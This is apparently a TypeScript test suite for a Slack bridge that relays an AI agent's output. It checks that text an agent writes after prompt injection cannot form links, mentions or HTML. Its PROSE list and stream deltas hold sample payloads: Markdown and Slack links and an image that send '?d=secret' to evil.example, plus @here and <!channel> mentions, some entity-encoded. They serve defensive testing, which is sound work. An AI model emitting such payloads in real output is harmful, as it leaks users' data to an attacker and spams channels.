// Text the bridge sends must carry no markup it did not mean to send, read
// by any parser: Slack's mrkdwn, Slack's Markdown, or CommonMark. The agent's
// text, a question, its options and display names are not the bridge's: a
// prompt injection can put any of these in them.

import { VERB, type CanonicalCard } from "@loomcycle/bridge-core";
import { describe, expect, it } from "vitest";

import { SlackApi } from "../src/api.js";
import { renderCard } from "../src/cards.js";
import { SlackStream } from "../src/stream.js";
import { escapeMrkdwn, neutralise } from "../src/text.js";
import { FakeSlack, silentLogger } from "./fakes.js";

const WJ = "\u2060";

/** What could open markup in Markdown sent as prose: any "<" (Slack's
 *  <url|label>, <!here>, <@U>, an autolink, HTML), any "]" that a "(", "["
 *  or ":" could follow (an inline link, a reference, a definition), any "&"
 *  (an entity that decodes to "<"), or a bare @here. Each must be broken by a
 *  word joiner. */
function liveInProse(out: string): string | undefined {
  const m = /<(?!\u2060)|\](?!\u2060)|&(?!\u2060)|@(here|channel|everyone)\b/i.exec(out);
  return m ? `${JSON.stringify(m[0])} at ${m.index} in ${JSON.stringify(out)}` : undefined;
}

/** No link with an external target can form, whatever a parser decides is code. */
function linkInCode(out: string): string | undefined {
  const m = /\]\(|\]:\s|<(?=[!@#]|[a-z][\w+.-]*:)|&(?=#|[a-z]+;)|@(here|channel|everyone)\b/i.exec(out);
  return m ? `${JSON.stringify(m[0])} at ${m.index} in ${JSON.stringify(out)}` : undefined;
}

const PROSE = [
  "[https://good.example](https://evil.example/?d=secret)",
  "[good][1]\n\n[1]: https://evil.example",
  "[good]\n\n[good]: https://evil.example",
  "![logo](https://evil.example/p.png?d=secret)",
  "[good](<https://evil.example>)",
  '[good](https://evil.example "title")',
  "<https://evil.example|https://good.example>",
  "<https://good.example|<!channel>>",
  "<https://a.example|b|c>",
  "<https://evil.example?x=<!here>|https://good.example>",
  "&lt;!channel&gt;",
  "&amp;lt;!here&amp;gt;",
  "&#60;!everyone&#62; &#x3C;@U0123&#x3E;",
  "<<<!channel",
  "]]((https://evil.example",
  "[[a](https://b.example)](https://c.example)",
  '<a href="https://evil.example">good</a>',
  "<https://evil.example>",
  "~~~\n[good](https://evil.example)\n~~~",
  // Not fences the bridge recognises, so prose: the HTML in them is broken.
  '~~~\n<a href="https://evil.example">good</a>\n~~~',
  '   ```\n<a href="https://evil.example">good</a>\n   ```',
  "    [good](https://evil.example)",
  "> [good](https://evil.example) @here",
  "`[good](https://evil.example)` and `<!here>`",
];

describe("Markdown text is inert by construction", () => {
  it.each(PROSE)("breaks every markup opener in %j", (input) => {
    const out = neutralise(input);
    expect(liveInProse(out)).toBeUndefined();
    // Nothing is dropped: the reader still sees what the agent wrote.
    expect(out.replaceAll(WJ, "")).toBe(input);
    expect(neutralise(out)).toBe(out);
  });

  it("keeps a fenced code block copyable, and still forms no link in it", () => {
    const input = "```js\nif (a < b && c[0][1]) { x = y <T>; }\nconst m = d[k]; // <!here> @channel\n[good](https://evil.example)\n```\nafter [a](https://evil.example)";
    const out = neutralise(input);
    const [code, after] = out.split("```\n");
    expect(code).toContain("if (a < b && c[0][1]) { x = y <T>; }");
    expect(code).toContain("const m = d[k];");
    expect(linkInCode(code)).toBeUndefined();
    expect(liveInProse(after)).toBeUndefined();
    expect(out.replaceAll(WJ, "")).toBe(input);
  });

  it("forms no link in a fence that never closes", () => {
    const out = neutralise("```\n[good](https://evil.example)\n<https://evil.example|good>\n[r]: https://evil.example");
    expect(linkInCode(out)).toBeUndefined();
  });

  it("puts nothing live in a card's question, context, options or result", () => {
    const evil = PROSE.join(" ");
    const card: CanonicalCard = {
      kind: "question",
      runId: "r",
      interruptId: "q",
      question: evil,
      context: evil,
      options: ["x".repeat(80) + evil.slice(0, 100)],
      buttons: [{ id: "b0", label: evil.slice(0, 70), action: { verb: VERB.answer, runId: "r", interruptId: "q", answer: "x" } }],
    };
    for (const c of [renderCard(card, "channel"), renderCard({ kind: "result", message: `Answered: ${evil}` }, "im")]) {
      for (const b of c.blocks) if (b.type === "markdown") expect(liveInProse(String(b.text))).toBeUndefined();
      expect(c.text).not.toMatch(/[<>]/);
    }
  });
});

describe("mrkdwn text is inert by construction", () => {
  it.each(PROSE)("escapes %j so Slack shows it as written", (input) => {
    const out = escapeMrkdwn(input);
    expect(out).not.toMatch(/[<>]/);
    // Every "&" is one of the three escapes, so none can decode to "<".
    expect(out.replace(/&(amp|lt|gt);/g, "")).not.toContain("&");
    expect(out).not.toMatch(/@(here|channel|everyone)\b/i);
  });

  it("shows a pre-escaped mention literally", () => {
    expect(escapeMrkdwn("&lt;!channel&gt;")).toBe("&amp;lt;!channel&amp;gt;");
  });
});

describe("a stream forms no markup across deltas", () => {
  async function stream(deltas: string[]): Promise<string> {
    const slack = new FakeSlack();
    const api = new SlackApi({ baseUrl: slack.base, token: "xoxb-t", fetch: slack.fetch });
    const s = new SlackStream(api, { channel: "D1", threadTs: "1", maxChars: 10_000, intervalMs: 0, fallback: async () => {}, log: silentLogger, conversation: "c" });
    for (const d of deltas) {
      s.emit(d);
      // Let each delta be sent on its own, as a slow model's would be.
      await new Promise((r) => setTimeout(r, 15));
    }
    await s.close();
    return [...slack.to("chat.startStream"), ...slack.to("chat.appendStream")].map((c) => String(c.body.markdown_text)).join("");
  }

  it.each([
    [["[good]", "(https://evil.example)"]],
    [["[good](", "https://evil.example)"]],
    [["see [good", "][1]\n\n[1]", ": https://evil.example"]],
    [["&l", "t;!here&gt;"]],
    [["<", "!channel>"]],
    [["@cha", "nnel"]],
  ])("in prose: %j", async (deltas) => {
    const out = await stream(deltas);
    expect(liveInProse(out)).toBeUndefined();
    expect(out.replaceAll(WJ, "")).toBe(deltas.join(""));
  });

  it.each([
    [["```\nx = c[0]", "(https://evil.example)\n```"]],
    [["```\n[r]", ": https://evil.example\n```"]],
    [["```\n<", "https://evil.example|good>\n```"]],
    [["```\n&l", "t;!here&gt;\n```"]],
    [["``", "`\n[a](https://evil.example)\n```"]],
  ])("in code: %j", async (deltas) => {
    const out = await stream(deltas);
    expect(linkInCode(out)).toBeUndefined();
    expect(out.replaceAll(WJ, "")).toBe(deltas.join(""));
  });

  it("knows a fence split across deltas, so code stays copyable and what follows is prose", async () => {
    const out = await stream(["``", "`js\nif (a < b && c[i][j]) {}\n``", '`\n<a href="https://evil.example">good</a>']);
    expect(out).toContain("if (a < b && c[i][j]) {}");
    const after = out.slice(out.lastIndexOf("```") + 3);
    expect(liveInProse(after)).toBeUndefined();
  });
});
